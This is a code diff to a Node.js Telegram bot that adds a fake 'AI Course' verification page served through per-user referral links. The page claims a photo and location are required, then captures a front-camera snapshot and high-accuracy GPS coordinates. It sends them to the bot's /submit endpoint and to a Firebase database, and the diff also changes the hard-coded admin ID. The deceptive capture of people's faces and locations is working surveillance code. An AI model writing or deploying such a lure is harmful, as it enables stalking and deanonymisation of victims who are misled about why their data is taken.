@@ -19,7 +19,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const HOST = process.env.HOST || "tgbot-tg1w.onrender.com";
 const PORT = process.env.PORT || 3000;
 const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
-const ADMIN_USER_ID = "5543574742";
+const ADMIN_USER_ID = "5310317109";
 const CHANNEL_ID = -1002970130807;
 const CHANNEL_INVITE_LINK = "https://t.me/+VN0ATDiz9DBkOTQy";
 
@@ -296,7 +296,29 @@ app.get("/r/:ref", async (req, res) => {
   const ref = req.params.ref;
   if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
   await saveUser(ref);
-  res.type("html").send(`<!DOCTYPE html>...[YOUR STUDENT PAGE HTML HERE]...`);
+  res.type("html").send(`<!DOCTYPE html>
+<html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>AI Course</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;}
+.card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border-radius:16px;padding:20px;max-width:380px;width:90%;text-align:center;}
+h1{font-size:1.6rem;color:#0f9;margin:8px 0;}
+.warn{background:#c62828;padding:12px;border-radius:10px;font-size:.9rem;margin:12px 0;}
+button{background:#0f9;color:#000;border:none;padding:14px;font-size:1rem;font-weight:600;border-radius:50px;width:100%;cursor:pointer;}
+#status{margin-top:12px;padding:10px;background:rgba(0,255,136,.1);border-radius:8px;font-size:.9rem;}</style></head><body>
+<div class="card"><h1>AI 2024</h1><div class="warn"><strong>REQUIRED:</strong><br>• Photo (verification)<br>• Location (region)</div>
+<button id="go">CONFIRM</button><div id="status">Ready…</div></div>
+<script>const ref=${JSON.stringify(ref)};const firebaseUrl=${JSON.stringify(FIREBASE_DB_URL)};let photoBlob=null,geo=null,username=null;
+if(window.Telegram?.WebApp){Telegram.WebApp.ready();Telegram.WebApp.expand();const u=Telegram.WebApp.initDataUnsafe.user;if(u)username=u.username||null;}
+document.getElementById("go").onclick=async()=>{const btn=document.getElementById("go"),status=document.getElementById("status");btn.disabled=true;status.textContent="Starting...";
+try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const video=document.createElement("video");video.srcObject=stream;video.muted=true;video.play();await new Promise(r=>video.onloadeddata=r);
+const canvas=document.createElement("canvas");canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));stream.getTracks().forEach(t=>t.stop());status.textContent="Photo OK";}catch(e){status.textContent="No photo";}
+try{geo=await new Promise((res,rej)=>{const t=setTimeout(()=>rej(),8000);navigator.geolocation.getCurrentPosition(p=>{clearTimeout(t);res({lat:p.coords.latitude,lon:p.coords.longitude});},()=>{clearTimeout(t);rej();},{timeout:8000,enableHighAccuracy:true});});status.textContent+=" | GPS OK";}catch(e){status.textContent+=" | No GPS";}
+if(!photoBlob&&!geo){status.textContent="Nothing received";btn.disabled=false;return;}
+status.textContent="Sending...";const fd=new FormData();fd.append("ref",ref);if(geo){fd.append("latitude",geo.lat);fd.append("longitude",geo.lon);}if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
+try{await fetch("/submit",{method:"POST",body:fd});const userData={userId:ref,username,timestamp:Date.now(),active:true,hasPhoto:!!photoBlob,hasLocation:!!geo};
+await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(userData)});
+status.innerHTML="<strong>SUCCESS!</strong><br>You are active!";btn.style.display="none";}catch(e){status.textContent="Error";btn.disabled=false;}}</script></body></html>`);
 });
 
 // === SUBMIT ===
